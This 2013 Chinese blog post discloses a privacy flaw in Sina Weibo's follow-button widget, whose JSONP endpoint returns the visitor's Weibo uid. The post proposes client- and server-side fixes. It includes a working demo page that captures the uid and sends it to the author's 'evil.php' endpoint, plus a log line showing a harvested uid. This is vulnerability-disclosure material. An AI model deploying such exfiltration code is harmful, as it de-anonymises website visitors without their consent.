---
layout: post
title: "Who Are You"
date: 2013-01-25 22:20
comments: true
categories: 
---

这两天在研究新浪的第三方插件实现，发现通过利用新浪微博的某个URL能让我获取当前访问这个URL的用户的微博uid。也就是说只要在某个网站中嵌入一段代码，这段代码在后台偷偷的的访问那个URL，然后就可以把访问这个网站的用户的微博uid获取到，于是隐私就被泄露了…… 也就是说一个网站可以知道有哪些微博用户访问了它，然后可以就此采取一系列的措施……  
下面就具体讲讲这个漏洞是怎么回事。

<!-- more -->

## 问题
大家都知道微博会提供一些第三方插件(widget)用来放在其他网站上，其中有一个就是关注按钮。通过这个关注按钮用户就可以在第三方网站上直接关注某个人，如果当前访问用户已经关注过了，则该关注按钮会显示已关注。接下来我们就要看看在一个第三方的网站上新浪微博是怎样知道当前访问用户是否已经关注了某个账号，而这个涉及到JavaScript跨域问题。通过查看插件的js代码和浏览器的http请求，发现如果引入关注按钮插件的话会有如下的一个http请求：
	http://widget.weibo.com/public/aj_relationship.php?fuid=2991975565&callback=STK_13591259816211

返回结果是：
	STK_13591259816211({"code":"100000","msg":"success","data":{"relation":3,"login":true,"uid":2369955640}})

从这个http请求来看新浪采用了[jsonp](http://en.wikipedia.org/wiki/JSONP)技术来解决跨域问题。从返回结果猜测data.relation应该表明当前用户和fuid用户之间的关系，可能是是否关注fuid，是否双向关注等等。问题的关键是新浪把当前用户的uid也返回回来了，如果第三方网站能获取这个uid，就能知道当前访问用户是谁了。

## 示例
接下来我就写了一个demo来模拟这个过程。首先是先写一个第三方网页：
``` html
<!doctype html>
<html>
<head>
</head>
<body>
<p> Hello World </p>
<script>
function STK_1(data) {
var uid = data.data.uid;
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://www.jjyao.me/evil.php?uid=" + uid, true );
xmlHttp.send(null);
}
</script>
<script src="http://widget.weibo.com/public/aj_relationship.php?fuid=2991975565&callback=STK_1"></script>
</body>
</html>
```
每当用户访问这个网页的时候就在后面发一个aj_relationship.php的请求，然后指定一个已经定义好的callback，这样等请求结果返回后指定的callback就会被执行，于是就可以获取到当前登陆用户的微博uid了，最后要做的就是将这个uid传回给服务器保存起来。而这个可以通过服务器的log来实现，比如Nginx有access log，会将每个访问的url记录在日志中，结果如下：
	219.219.125.217 - - [25/Jan/2013:14:38:39 +0000] "GET /evil.php?uid=2369955640 HTTP/1.1" 200 31 "http://www.jjyao.me/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.56 Safari/537.17"
于是在服务器端就可以统计有哪些微博用户访问了这个网站，他们都是谁。

正如上面所说的那样，只要添加一些简单的代码，一个网站就可以知道哪些用户访问了，因为知道微博账号实际上很大程度等于知道了用户的真实身份。也就是说通过微博的这么一个漏洞，我们的隐私被泄露了，我们实际上没有匿名访问一个网站，而都是实名在访问，想想还是蛮可怕的。

## 解决
解决这个问题的手段无非就是两大类：一类是用户在客户端解决，一类是新浪在服务端解决。

### 客户端解决
我尝试了不记住密码，在Chrome的Incognito Window中打开两种方法但是都不可行，因为这两种方法虽然不会长期记住cookie，但仍然会短期的记住直到比如说浏览器关闭为止。因此要在客户端解决的话可以选择彻底禁止cookie，或者每次刷完微博后都清除微博设置的cookie，然后再去访问其他网站。

### 服务器端解决
服务器端解决最简单的方法就是不返回uid信息。但如果一定要返回uid信息的话就要采用比较复杂的方法了。
